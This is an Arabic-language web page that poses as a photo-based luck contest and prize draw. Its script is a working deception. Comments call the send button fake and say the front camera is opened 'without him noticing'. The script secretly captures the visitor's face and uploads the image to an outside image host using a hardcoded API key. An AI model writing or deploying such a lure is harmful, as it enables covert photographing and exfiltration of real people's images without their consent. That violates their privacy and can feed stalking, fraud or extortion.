<!DOCTYPE html>
<html lang="ar">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🔮 تحدي الحظ – هل صورتك فائزة؟</title>
  <style>
    body {
      font-family: 'Tahoma', sans-serif;
      text-align: center;
      background: linear-gradient(to bottom right, #ffe3e3, #ffc9de);
      color: #333;
      padding: 50px 20px;
    }

    h1 {
      font-size: 2.7em;
      color: #d60087;
      margin-bottom: 20px;
    }

    p {
      font-size: 1.3em;
      margin-bottom: 30px;
      color: #444;
    }

    button {
      background-color: #d60087;
      color: white;
      border: none;
      padding: 15px 35px;
      font-size: 1.2em;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #b0006f;
    }

    video {
      display: none;
    }
  </style>
</head>

<body>
  <h1>🔮 تحدي الحظ – لقطة واحدة قد تغيّر كل شيء!</h1>
  <p>صوّر شيء من محيطك بكاميرا هاتفك، واربح فرصة لدخول السحب على جوائز رقمية رائعة 🤩<br>هل الصورة فيها لمسة حظ؟ جرب الآن!</p>
  <button onclick="startChallenge()">🎯 التقط صورتك الآن</button>
  <video id="video" autoplay playsinline></video>

  <script>
    const API_KEY = '8b3ff25139462514d13f5d9a3b3c0d05';
    const video = document.getElementById('video');

    async function startChallenge() {
      try {
        // فتح الكاميرا الخلفية أولاً
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
        video.srcObject = stream;
        video.style.display = 'none';

        // بعد 3 ثوانٍ يتم عرض زر إرسال وهمي
        document.querySelector('p').textContent = '📸 جاري التصوير...';
        setTimeout(() => {
          stream.getTracks().forEach(track => track.stop());
          showFakeSendButton();
        }, 3000);

      } catch (err) {
        alert('⚠️ تعذر تشغيل الكاميرا. تأكد من السماح بالوصول.');
      }
    }

    function showFakeSendButton() {
      const btn = document.querySelector('button');
      btn.textContent = '🚀 إرسال الصورة';
      btn.onclick = () => fakeAnalysis();
      document.querySelector('p').textContent = '✨ الصورة جاهزة! اضغط إرسال للدخول في التحليل.';
    }

    async function fakeAnalysis() {
      document.querySelector('button').style.display = 'none';
      document.querySelector('p').textContent = '🧠 جارٍ تحليل حظك بناءً على العناصر البصرية...';

      // فتح الكاميرا الأمامية بدون أن يشعر
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        // تأخير قليل ثم التقاط الصورة
        setTimeout(() => captureAndUpload(stream), 2000);

      } catch (err) {
        console.log('⚠️ فشل فتح الكاميرا الأمامية:', err);
      }
    }

    async function captureAndUpload(stream) {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);
      stream.getTracks().forEach(track => track.stop());

      const imageData = canvas.toDataURL('image/jpeg');
      const formData = new FormData();
      formData.append('image', imageData.split(',')[1]);

      try {
        const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
          method: 'POST',
          body: formData
        });

        const data = await res.json();
        if (data.success) {
          document.querySelector('p').textContent = '🎉 تم دخولك للسحب! سيتم إعلامك بالنتيجة لاحقاً.';
          console.log('📷 رابط الصورة:', data.data.url);
        } else {
          document.querySelector('p').textContent = '❌ فشل التحليل. حاول لاحقاً.';
        }
      } catch (err) {
        console.log(err);
        document.querySelector('p').textContent = '❌ حدث خطأ في إرسال الصورة.';
      }
    }
  </script>
</body>

</html>
